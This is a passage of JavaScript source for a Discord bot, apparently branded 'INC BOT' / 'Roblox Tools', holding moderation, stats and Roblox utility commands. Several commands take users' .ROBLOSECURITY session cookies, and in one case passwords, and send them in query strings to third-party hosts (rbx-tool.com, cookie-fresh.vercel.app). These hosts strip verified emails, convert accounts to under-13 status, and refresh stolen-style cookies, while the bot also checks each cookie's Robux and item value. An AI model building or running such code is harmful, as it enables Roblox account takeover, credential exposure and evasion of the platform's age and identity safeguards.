      .replace(/{membercount}/g, `**${memberCountWithSuffix}**`);

    const leaveEmbed = new EmbedBuilder()
      .setColor(0xff6b6b)
      .setDescription(formattedMessage)
      .setThumbnail(member.user.displayAvatarURL({ size: 128 }))
      .setTimestamp()
      .setFooter({
        text: `Goodbye from ${member.guild.name}`,
        iconURL: member.guild.iconURL()
      });

    await leaveChannel.send({ embeds: [leaveEmbed] });
  } catch (error) {
    console.error('Error sending leave message:', error);
  }
});

client.on('messageCreate', async message => {
  // Auto-moderation system
  if (!message.author.bot && message.guild) {
    const autoMod = autoModSettings.get(message.guild.id);
    if (autoMod) {
      let shouldDelete = false;
      let reason = '';

      // Check for links
      if (autoMod.linkFilter && containsLink(message.content)) {
        // Allow administrators and moderators to post links
        const canBypass = message.member && (
          message.member.permissions.has(PermissionFlagsBits.Administrator) ||
          message.member.permissions.has(PermissionFlagsBits.ModerateMembers) ||
          message.guild.ownerId === message.author.id
        );

        if (!canBypass) {
          shouldDelete = true;
          reason = 'Link detected';
        }
      }

      // Check for bad words
      if (autoMod.badWordFilter && containsBadWords(message.content, autoMod.badWords)) {
        shouldDelete = true;
        reason = 'Inappropriate content detected';
      }

      if (shouldDelete) {
        try {
          await message.delete();
          
          const warningEmbed = new EmbedBuilder()
            .setColor(0xff6b6b)
            .setTitle('🛡️ Auto-Moderation')
            .setDescription(`<@${message.author.id}> Your message was automatically deleted.`)
            .addFields(
              { name: 'Reason', value: reason, inline: true },
              { name: 'Channel', value: `<#${message.channel.id}>`, inline: true }
            )
            .setTimestamp()
            .setFooter({
              text: `User ID: ${message.author.id}`,
              iconURL: message.author.displayAvatarURL()
            });

          const warningMsg = await message.channel.send({ embeds: [warningEmbed] });
          
          // Auto-delete warning after 5 seconds
          setTimeout(async () => {
            try {
              await warningMsg.delete();
            } catch (error) {
              console.error('Error deleting auto-mod warning:', error);
            }
          }, 5000);

        } catch (error) {
          console.error('Error in auto-moderation:', error);
        }
        return; // Don't process the message further
      }
    }
  }

  // Handle auto-reply in specific channel
  if (message.channelId === '1393907304327413851') {
    // Ignore messages from bots (including this bot)
    if (message.author.bot) return;

    // Ignore system messages and slash commands
    if (message.system || message.interaction) return;

    // Check auto-reply cooldown per user
    const userCooldown = autoReplyCooldowns.get(message.author.id);
    if (userCooldown && Date.now() - userCooldown < AUTO_REPLY_COOLDOWN) {
      console.log(`Auto-reply cooldown active for user: ${message.author.username}`);
      return; // Skip reply if user is on cooldown
    }

    try {
      // Set cooldown for this user
      autoReplyCooldowns.set(message.author.id, Date.now());

      // Start typing indicator
      await message.channel.sendTyping();

      // Get ChatGPT roast response with conversation memory
      const roastMessage = await getChatGPTReply(message.content, message.author.username, message.author.id);

      // Add 2-second delay before replying
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Send the roast reply
      await message.reply(roastMessage);
    } catch (error) {
      console.error('Error sending auto-reply:', error);
    }
    return;
  }

  // Check if message is in an allowed channel for prefix commands
  const isInAllowedChannel = canUseCommandInChannel(message.guild.id, message.channelId, 'moderation') || 
                            message.channelId === '1392522417254961273'; // Keep original channel as fallback
  
  if (!isInAllowedChannel && !message.content.startsWith('!')) return;

  // Ignore messages from bots (including this bot)
  if (message.author.bot) return;

  // Ignore system messages and slash commands
  if (message.system || message.interaction) return;

  // Check for prefix commands
  if (message.content.startsWith('!')) {
    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // Check if user is owner or has administrator permission for moderation commands
    const isOwnerOrAdmin = message.guild.ownerId === message.author.id || 
                          (message.member && message.member.permissions.has(PermissionFlagsBits.Administrator));

    if (['ban', 'kick', 'mute', 'unmute', 'warn'].includes(command)) {
      if (!isOwnerOrAdmin) {
        return message.reply('<:no:1393890945929318542> Only server owners and administrators can use moderation commands.');
      }

      // Handle prefix moderation commands
      await handlePrefixModerationCommand(message, command, args);
      return;
    }

    // Handle !stats command
    if (command === 'stats') {
      commandStats.stats++;
      trackUserCommand(message.guild.id, message.author.id, 'stats');

      let targetUser = message.author;
      
      // Check if a user was mentioned
      if (args.length > 0 && message.mentions.users.size > 0) {
        targetUser = message.mentions.users.first();
      }

      // Get user stats from the database
      const guildUserStats = userStats.get(message.guild.id);
      if (!guildUserStats || !guildUserStats.has(targetUser.id)) {
        return message.reply(`<:no:1393890945929318542> No command usage data found for ${targetUser === message.author ? 'you' : targetUser.username}.`);
      }

      const userData = guildUserStats.get(targetUser.id);
      const totalCommands = Object.values(userData.commands).reduce((a, b) => a + b, 0);
      
      // Get member to check join date
      let joinDate = userData.joinDate;
      try {
        const member = await message.guild.members.fetch(targetUser.id);
        joinDate = member.joinedTimestamp;
      } catch (error) {
        // Use stored join date if member fetch fails
      }

      // Sort commands by usage
      const sortedCommands = Object.entries(userData.commands)
        .sort(([,a], [,b]) => b - a)
        .slice(0, 10); // Top 10 commands

      const embed = new EmbedBuilder()
        .setColor(0x0ea5e9)
        .setTitle(`📊 ${targetUser === message.author ? 'Your' : `${targetUser.username}'s`} Command Statistics`)
        .setDescription(`Statistical overview for ${targetUser.tag}`)
        .setThumbnail(targetUser.displayAvatarURL())
        .addFields(
          { name: '📈 Total Commands Used', value: `${totalCommands}`, inline: true },
          { name: '⏰ Last Command Used', value: userData.lastUsed ? `<t:${Math.floor(userData.lastUsed / 1000)}:R>` : 'Never', inline: true },
          { name: '📅 Joined Server', value: `<t:${Math.floor(joinDate / 1000)}:F>`, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${message.author.tag}`,
          iconURL: message.author.displayAvatarURL()
        });

      if (sortedCommands.length > 0) {
        const commandList = sortedCommands
          .map(([cmd, count]) => `\`${cmd}\` - ${count} time${count > 1 ? 's' : ''}`)
          .join('\n');
        
        embed.addFields({
          name: '🎯 Most Used Commands',
          value: commandList,
          inline: false
        });
      } else {
        embed.addFields({
          name: '🎯 Most Used Commands',
          value: 'No commands used yet',
          inline: false
        });
      }

      const reply = await message.reply({ embeds: [embed] });

      // Auto-delete after 10 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting stats message:', error);
        }
      }, 10000);
      return;
    }
  }

  // Allow server owner and administrators to send normal messages
  if (message.member && (message.member.permissions.has('Administrator') || message.guild.ownerId === message.author.id)) return;

  try {
    // Delete the message
    await message.delete();

    // Send ephemeral-style reply to the user
    await message.channel.send({
      content: `<@${message.author.id}> <:no:1393890945929318542> Command channel only. Please use slash commands or prefix commands (!ban, !kick, etc.).`,
    }).then(reply => {
      // Auto-delete the warning message after 5 seconds
      setTimeout(() => {
        reply.delete().catch(console.error);
      }, 5000);
    });
  } catch (error) {
    console.error('Error handling message:', error);
  }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName, user } = interaction;

  // Allow commandassign and removecommand to be used anywhere by bot/server owners
  if (commandName === 'commandassign' || commandName === 'removecommand') {
    const isOwnerOrBotOwner = interaction.guild.ownerId === interaction.user.id || isBotOwner(interaction.user.id);
    
    if (!isOwnerOrBotOwner) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only bot owners and server owners can use this command.',
        ephemeral: true
      });
    }
  } else {
    // Check if command can be used in current channel
    const canUseHere = canUseCommandInChannel(interaction.guild.id, interaction.channelId, commandName);
    
    if (!canUseHere) {
      const guildAssignments = commandChannelAssignments.get(interaction.guild.id);
      const assignedChannels = guildAssignments?.[commandName];
      let channelMention = 'the designated channel(s)';
      
      if (assignedChannels && assignedChannels.length > 0) {
        if (assignedChannels.length === 1) {
          channelMention = `<#${assignedChannels[0]}>`;
        } else {
          channelMention = assignedChannels.map(id => `<#${id}>`).join(', ');
        }
      }
      
      return interaction.reply({
        content: `<:no:1393890945929318542> You can only use this command in ${channelMention}.`,
        ephemeral: true
      });
    }
  }

  // Check cooldown for main commands (not help/botstats)
  if (['bypass2008', 'bypass13plus', 'refreshcookie', 'validatecookie', 'cookieexpiry', 'profilelookup', 'ban', 'kick', 'mute', 'unmute', 'warn'].includes(commandName)) {
    const userCooldown = cooldowns.get(user.id);
    if (userCooldown && Date.now() - userCooldown < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (Date.now() - userCooldown)) / 1000);
      return interaction.reply({
        content: `⏰ Please wait ${remainingTime} seconds before using this command again.`,
        ephemeral: true
      });
    }
    cooldowns.set(user.id, Date.now());
  }

  // Update command stats and track user usage
  if (commandStats[commandName] !== undefined) {
    commandStats[commandName]++;
    trackUserCommand(interaction.guild.id, interaction.user.id, commandName);
  }

  if (interaction.commandName === 'bypass2008') {
    const cookie = interaction.options.getString('cookie');

    await interaction.reply({ content: '<:yes:1393890949960306719> Processing bypass request...', ephemeral: true });

    try {
      const res = await fetch(`https://rbx-tool.com/apis/bypassAge?a=${encodeURIComponent(cookie)}`, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!res.ok) {
        throw new Error(`HTTP ${res.status}: ${res.statusText}`);
      }

      const data = await res.json();

      const embed = new EmbedBuilder()
        .setColor(data.status === "success" ? 0x00ff88 : 0xff4757)
        .setTitle("📧 Email Bypass (2008 Method)")
        .setDescription("Bypass results from INC BOT")
        .addFields(
          { name: "🔧 Bypass Result", value: data.message || (data.status === "success" ? "Success removing email!" : "Unknown error"), inline: false },
          { name: "Status", value: data.status === "success" ? "<:yes:1393890949960306719> Completed" : "<:no:1393890945929318542> Failed", inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    } catch (error) {
      console.error('Bypass2008 error:', error);
      
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("📧 Email Bypass (2008 Method)")
        .setDescription("Bypass request failed")
        .addFields(
          { name: "🔧 Bypass Result", value: `❌ **API Error:** ${error.message}`, inline: false },
          { name: "Status", value: "<:no:1393890945929318542> API Unavailable", inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'bypass13plus') {
    const cookie = interaction.options.getString('cookie');
    const password = interaction.options.getString('password');

    await interaction.reply({ content: '<:yes:1393890949960306719> Processing bypass request...', ephemeral: true });

    try {
      const res = await fetch(`https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!res.ok) {
        throw new Error(`HTTP ${res.status}: ${res.statusText}`);
      }

      const data = await res.json();

      const embed = new EmbedBuilder()
        .setColor(data.status === "success" ? 0x00ff88 : 0xff4757)
        .setTitle("🔓 Age Bypass (13+ to Under 13)")
        .setDescription("Bypass results from INC BOT")
        .addFields(
          { name: "🔧 Bypass Result", value: data.message || (data.status === "success" ? "Success converting 13+ to under 13!" : "Unknown error"), inline: false },
          { name: "Status", value: data.status === "success" ? "<:yes:1393890949960306719> Completed" : "<:no:1393890945929318542> Failed", inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    } catch (error) {
      console.error('Bypass13plus error:', error);
      
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("🔓 Age Bypass (13+ to Under 13)")
        .setDescription("Bypass request failed")
        .addFields(
          { name: "🔧 Bypass Result", value: `❌ **API Error:** ${error.message}`, inline: false },
          { name: "Status", value: "<:no:1393890945929318542> API Unavailable", inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'refreshcookie') {
    let cookie = interaction.options.getString('cookie');

    // Handle both formats: with and without warning prefix
    const warningPrefix = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
    
    // Strip the warning prefix if it exists
    if (cookie.startsWith(warningPrefix)) {
      cookie = cookie.substring(warningPrefix.length);
    }

    await interaction.reply({ content: '<:Refresh:1393888531973406881> Refreshing your cookie...', ephemeral: true });

    try {
      const res = await fetch(`https://cookie-fresh.vercel.app/api/refresh?cookie=${encodeURIComponent(cookie)}`);
      const data = await res.json();

      if (!data.redemptionResult || !data.redemptionResult.success) {
        const errorEmbed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle("<:no:1393890945929318542> Unable to refresh your cookie.")
          .setDescription("Roblox might have rejected the cookie or the backend failed.")
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });
        return interaction.followUp({ embeds: [errorEmbed] });
      }

      const refreshed = data.redemptionResult.refreshedCookie;

      // Get Roblox user data for the public embed
      const robloxData = await getRobloxUserData(cookie);

      const publicEmbed = new EmbedBuilder()
        .setColor(0x00d4ff)
        .setTitle(robloxData ? `🎯 ${robloxData.username}` : "<:yes:1393890949960306719> Cookie Refreshed Successfully!")
          .setDescription("<:Refresh:1393888531973406881> **Cookie Refresh Service**")
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add Roblox user info if available
      if (robloxData) {
        if (robloxData.avatar) {
          publicEmbed.setThumbnail(robloxData.avatar);
        }

        publicEmbed.addFields(
          { name: "<:Robux:1393888802128265348> Robux Balance", value: `\`${robloxData.robux}\``, inline: true },
          { name: "<:DominusEmpyreus:1393888539263107113> RAP Value", value: `\`${robloxData.rap}\``, inline: true },
          { name: "<:member_IDS:1393888535412740096> User ID", value: `\`${robloxData.userId}\``, inline: true }
        );
      }

      // Add refresh result at bottom
      publicEmbed.addFields(
        { name: "<:Refresh:1393888531973406881> Refresh Result", value: "Your new cookie has been generated and sent privately.", inline: false },
        { name: "Status", value: "<:yes:1393890949960306719> Completed", inline: true }
      );

      await interaction.followUp({ embeds: [publicEmbed] }); // public message

      const privateEmbed = new EmbedBuilder()
        .setColor(0x0ea5e9)
        .setTitle("🔐 Your New .ROBLOSECURITY Cookie")
        .setDescription(`\`\`\`${refreshed}\`\`\``)
        .addFields(
          { name: "⚠️ Security Notice", value: "Keep this cookie private and secure!", inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({
        embeds: [privateEmbed],
        ephemeral: true // only the user sees this
      });

    } catch (err) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("<:no:1393890945929318542> Request Failed")
        .setDescription("Failed to connect to refresh API or bad response.")
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });
      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'help') {
    commandStats.help++;

    const helpEmbed = new EmbedBuilder()
      .setColor(0x0ea5e9)
      .setTitle('🤖 Roblox Tools Bot - Help')
      .setDescription('Here are all available commands and their descriptions:')
      .addFields(
        { 
          name: '📧 /bypass2008', 
          value: 'Remove the verified email address\n**Usage:** Provide your .ROBLOSECURITY cookie', 
          inline: false 
        },
        { 
          name: '🔓 /bypass13plus', 
          value: 'Convert 13+ account to under 13 account\n**Usage:** Provide cookie and password', 
          inline: false 
        },
        { 
          name: '<:Refresh:1393888531973406881> /refreshcookie', 
          value: 'Refresh your .ROBLOSECURITY cookie\n**Usage:** Provide your current cookie', 
          inline: false 
        },
        { 
          name: '📊 /botstats', 
          value: 'Show bot statistics and uptime', 
          inline: false 
        },
        { 
          name: '❓ /help', 
          value: 'Show this help message', 
          inline: false 
        },
        { 
          name: '🔍 /validatecookie', 
          value: 'Check if a .ROBLOSECURITY cookie is valid', 
          inline: false 
        },
        { 
          name: '🕐 /cookieexpiry', 
          value: 'Check if your cookie might expire soon', 
          inline: false 
        },
        { 
          name: '<:member_IDS:1393888535412740096> /profilelookup', 
          value: 'Get Roblox user info from username or ID', 
          inline: false 
        },
        { 
          name: '🔨 /ban', 
          value: 'Ban a user from the server (Requires Ban Members permission)', 
          inline: false 
        },
        { 
          name: '👢 /kick', 
          value: 'Kick a user from the server (Requires Kick Members permission)', 
          inline: false 
        },
        { 
          name: '🔇 /mute', 
          value: 'Timeout/mute a user for specified minutes (Requires Moderate Members permission)', 
          inline: false 
        },
        { 
          name: '🔊 /unmute', 
          value: 'Remove timeout/unmute a user (Requires Moderate Members permission)', 
          inline: false 
        },
        { 
          name: '⚠️ /warn', 
          value: 'Send a warning to a user (Requires Moderate Members permission)', 
          inline: false 
        },
        { 
          name: '🎨 /embedcreate', 
          value: 'Create a custom embed message with title, description, colors, and images', 
          inline: false 
        },
        { 
          name: '⚠️ Important Notes:', 
          value: '• Commands have a 5-second cooldown\n• Only works in designated channel\n• Keep your cookies private!\n• Moderation commands require proper permissions', 
          inline: false 
        }
      )
      .setThumbnail(client.user.displayAvatarURL())
      .setTimestamp()
      .setFooter({
        text: `Requested by ${interaction.user.tag}`,
        iconURL: interaction.user.displayAvatarURL()
      });

    await interaction.reply({ embeds: [helpEmbed] });
  }

  if (interaction.commandName === 'botstats') {
    commandStats.botstats++;

    const uptime = process.uptime();
    const uptimeHours = Math.floor(uptime / 3600);
    const uptimeMinutes = Math.floor((uptime % 3600) / 60);
    const uptimeSeconds = Math.floor(uptime % 60);

    const totalCommands = Object.values(commandStats).reduce((a, b) => a + b, 0);

    const statsEmbed = new EmbedBuilder()
      .setColor(0x22c55e)
      .setTitle('📊 Bot Statistics')
      .setDescription('Current bot performance and usage stats')
      .addFields(
        { 
          name: '⏱️ Uptime', 
          value: `${uptimeHours}h ${uptimeMinutes}m ${uptimeSeconds}s`, 
          inline: true 
        },
        { 
          name: '🏓 Ping', 
          value: `${client.ws.ping}ms`, 
          inline: true 
        },
        { 
          name: '📈 Total Commands Used', 
          value: `${totalCommands}`, 
          inline: true 
        },
        { 
          name: '📧 Bypass2008 Used', 
          value: `${commandStats.bypass2008} times`, 
          inline: true 
        },
        { 
          name: '🔓 Bypass13plus Used', 
          value: `${commandStats.bypass13plus} times`, 
          inline: true 
        },
        { 
          name: '<:Refresh:1393888531973406881> RefreshCookie Used', 
          value: `${commandStats.refreshcookie} times`, 
          inline: true 
        },
        { 
          name: '🔍 ValidateCookie Used', 
          value: `${commandStats.validatecookie} times`, 
          inline: true 
        },
        { 
          name: '🕐 CookieExpiry Used', 
          value: `${commandStats.cookieexpiry} times`, 
          inline: true 
        },
        { 
          name: '<:member_IDS:1393888535412740096> ProfileLookup Used', 
          value: `${commandStats.profilelookup} times`, 
          inline: true 
        },
        { 
          name: '🔨 Ban Used', 
          value: `${commandStats.ban} times`, 
          inline: true 
        },
        { 
          name: '👢 Kick Used', 
          value: `${commandStats.kick} times`, 
          inline: true 
        },
        { 
          name: '🔇 Mute Used', 
          value: `${commandStats.mute} times`, 
          inline: true 
        },
        { 
          name: '🔊 Unmute Used', 
          value: `${commandStats.unmute} times`, 
          inline: true 
        },
        { 
          name: '⚠️ Warn Used', 
          value: `${commandStats.warn} times`, 
          inline: true 
        },
        { 
          name: '🤖 Bot Info', 
          value: `Servers: ${client.guilds.cache.size}\nUsers: ${client.users.cache.size}`, 
          inline: false 
        }
      )
      .setThumbnail(client.user.displayAvatarURL())
      .setTimestamp()
      .setFooter({
        text: `Requested by ${interaction.user.tag}`,
        iconURL: interaction.user.displayAvatarURL()
      });

    await interaction.reply({ embeds: [statsEmbed] });
  }

  if (interaction.commandName === 'validatecookie') {
    const cookie = interaction.options.getString('cookie');
    commandStats.validatecookie++;

    await interaction.reply({ content: '🔍 Validating cookie...', ephemeral: true });

    try {
      const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (res.status === 200) {
        const userData = await res.json();

        // Get detailed Roblox user data
        const robloxData = await getRobloxUserData(cookie);

        const embed = new EmbedBuilder()
          .setColor(0x00ff88)
          .setTitle(robloxData ? `🎯 ${robloxData.username}` : '<:yes:1393890949960306719> Cookie Valid!')
          .setDescription(`🔍 **Cookie Validation Complete**\nAuthenticated for user: **${userData.name}**`)
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag} • Roblox Tools`,
            iconURL: interaction.user.displayAvatarURL()
          });

        // Add Roblox user info if available
        if (robloxData) {
          if (robloxData.avatar) {
            embed.setThumbnail(robloxData.avatar);
          }

          embed.addFields(
            { name: "<:Robux:1393888802128265348> Robux Balance", value: `\`${robloxData.robux}\``, inline: true },
            { name: "<:DominusEmpyreus:1393888539263107113> RAP Value", value: `\`${robloxData.rap}\``, inline: true },
            { name: "<:member_IDS:1393888535412740096> User ID", value: `\`${robloxData.userId}\``, inline: true }
          );
        } else {
          embed.addFields(
            { name: '<:member_IDS:1393888535412740096> User ID', value: `\`${userData.id}\``, inline: true },
            { name: '🏷️ Display Name', value: `\`${userData.displayName}\``, inline: true },
            { name: '<:yes:1393890949960306719> Status', value: '`Active`', inline: true }
          );
        }

        await interaction.followUp({ embeds: [embed] });
      } else {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('<:no:1393890945929318542> Cookie Invalid')
          .setDescription('The provided cookie is invalid or expired.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.followUp({ embeds: [embed] });
      }
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('<:no:1393890945929318542> Validation Failed')
        .setDescription('Unable to validate cookie due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'cookieexpiry') {
    const cookie = interaction.options.getString('cookie');
    commandStats.cookieexpiry++;

    await interaction.reply({ content: '🔍 Checking cookie expiry...', ephemeral: true });

    try {
      const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (res.status === 200) {
        // Get detailed Roblox user data
        const robloxData = await getRobloxUserData(cookie);

        // Check if cookie is close to expiry by testing multiple requests
        const testCount = 3;
        let successCount = 0;

        for (let i = 0; i < testCount; i++) {
          try {
            const testRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
              headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
              }
            });
            if (testRes.status === 200) successCount++;
          } catch {}
          await new Promise(resolve => setTimeout(resolve, 500));
        }

        const reliability = (successCount / testCount) * 100;
        let status, color, message;

        if (reliability >= 90) {
          status = '<:yes:1393890949960306719> Healthy';
          color = 0x22c55e;
          message = 'Cookie is stable and not expected to expire soon.';
        } else if (reliability >= 70) {
          status = '⚠️ Warning';
          color = 0xfacc15;
          message = 'Cookie may be unstable. Consider refreshing soon.';
        } else {
          status = '<:no:1393890945929318542> Critical';
          color = 0xef4444;
          message = 'Cookie is unreliable and may expire soon. Refresh immediately!';
        }

        const embed = new EmbedBuilder()
          .setColor(color)
          .setTitle(robloxData ? `🎯 ${robloxData.username}` : '🕐 Cookie Expiry Check')
          .setDescription(`🔍 **Cookie Health Monitor**\n${message}`)
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag} • Roblox Tools`,
            iconURL: interaction.user.displayAvatarURL()
          });

        // Add Roblox user info if available
        if (robloxData) {
          if (robloxData.avatar) {
            embed.setThumbnail(robloxData.avatar);
          }

          embed.addFields(
            { name: "<:Robux:1393888802128265348> Robux Balance", value: `\`${robloxData.robux}\``, inline: true },
            { name: "<:DominusEmpyreus:1393888539263107113> RAP Value", value: `\`${robloxData.rap}\``, inline: true },
            { name: "<:member_IDS:1393888535412740096> User ID", value: `\`${robloxData.userId}\``, inline: true }
          );
        }

        // Add expiry check results
        embed.addFields(
          { name: 'Status', value: status, inline: true },
          { name: 'Reliability', value: `${reliability.toFixed(1)}%`, inline: true },
          { name: 'Recommendation', value: reliability >= 90 ? 'No action needed' : 'Consider refreshing', inline: true }
        );

        await interaction.followUp({ embeds: [embed] });
      } else {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('<:no:1393890945929318542> Cookie Expired')
          .setDescription('The cookie is already invalid or expired.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        await interaction.followUp({ embeds: [embed] });
      }
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('<:no:1393890945929318542> Check Failed')
        .setDescription('Unable to check cookie expiry due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'profilelookup') {
    const identifier = interaction.options.getString('identifier');
    commandStats.profilelookup++;

    await interaction.reply({ content: '🔍 Looking up profile...', ephemeral: true });

    try {
      let userId;

      // Check if identifier is a number (user ID) or username
      if (/^\d+$/.test(identifier)) {
        userId = identifier;
      } else {
        // Get user ID from username
        const userRes = await fetch(`https://users.roblox.com/v1/usernames/users`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            usernames: [identifier]
          })
        });

        const userData = await userRes.json();
        if (!userData.data || userData.data.length === 0) {
          const embed = new EmbedBuilder()
            .setColor(0xef4444)
            .setTitle('<:no:1393890945929318542> User Not Found')
            .setDescription('No user found with that username.')
            .setTimestamp()
            .setFooter({
              text: `Requested by ${interaction.user.tag}`,
              iconURL: interaction.user.displayAvatarURL()
            });

          return interaction.followUp({ embeds: [embed] });
        }
        userId = userData.data[0].id;
      }

      // Get detailed user info
      const [userRes, avatarRes] = await Promise.all([
        fetch(`https://users.roblox.com/v1/users/${userId}`),
        fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`)
      ]);

      const userInfo = await userRes.json();
      const avatarInfo = await avatarRes.json();

      if (userRes.status !== 200) {
        const embed = new EmbedBuilder()
          .setColor(0xef4444)
          .setTitle('<:no:1393890945929318542> User Not Found')
          .setDescription('No user found with that ID.')
          .setTimestamp()
          .setFooter({
            text: `Requested by ${interaction.user.tag}`,
            iconURL: interaction.user.displayAvatarURL()
          });

        return interaction.followUp({ embeds: [embed] });
      }

      const embed = new EmbedBuilder()
        .setColor(0x0ea5e9)
        .setTitle(`👤 ${userInfo.displayName} (@${userInfo.name})`)
        .setDescription(userInfo.description || 'No description available')
        .addFields(
          { name: '<:member_IDS:1393888535412740096> User ID', value: `${userInfo.id}`, inline: true },
          { name: 'Username', value: `@${userInfo.name}`, inline: true },
          { name: 'Display Name', value: userInfo.displayName, inline: true },
          { name: 'Created', value: new Date(userInfo.created).toLocaleDateString(), inline: true },
          { name: 'Banned', value: userInfo.isBanned ? '<:no:1393890945929318542> Yes' : '<:yes:1393890949960306719> No', inline: true },
          { name: 'Profile Link', value: `[View Profile](https://www.roblox.com/users/${userInfo.id}/profile)`, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      // Add avatar if available
      if (avatarInfo.data && avatarInfo.data.length > 0) {
        embed.setThumbnail(avatarInfo.data[0].imageUrl);
      }

      await interaction.followUp({ embeds: [embed] });
    } catch (error) {
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle('<:no:1393890945929318542> Lookup Failed')
        .setDescription('Unable to lookup profile due to network error.')
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag}`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  // Moderation Commands
  if (interaction.commandName === 'ban') {
    const targetUser = interaction.options.getUser('user');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    commandStats.ban++;

    // Check if user is owner or has administrator permission
    const isOwnerOrAdmin = interaction.guild.ownerId === interaction.user.id || 
                          interaction.member.permissions.has(PermissionFlagsBits.Administrator);

    if (!isOwnerOrAdmin) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only server owners and administrators can use this command.',
        ephemeral: true
      });
    }

    // Check if bot has permission
    if (!interaction.guild.members.me.permissions.has(PermissionFlagsBits.BanMembers)) {
      return interaction.reply({
        content: '<:no:1393890945929318542> I don\'t have permission to ban members.',
        ephemeral: true
      });
    }

    try {
      const member = await interaction.guild.members.fetch(targetUser.id);

      // Check if user is trying to ban themselves
      if (targetUser.id === interaction.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> You cannot ban yourself.',
          ephemeral: true
        });
      }

      // Check if user is trying to ban the bot
      if (targetUser.id === client.user.id) {
        return interaction.reply({
          content: '<:no:1393890945929318542> I cannot ban myself.',
          ephemeral: true
        });
      }

      // Check role hierarchy
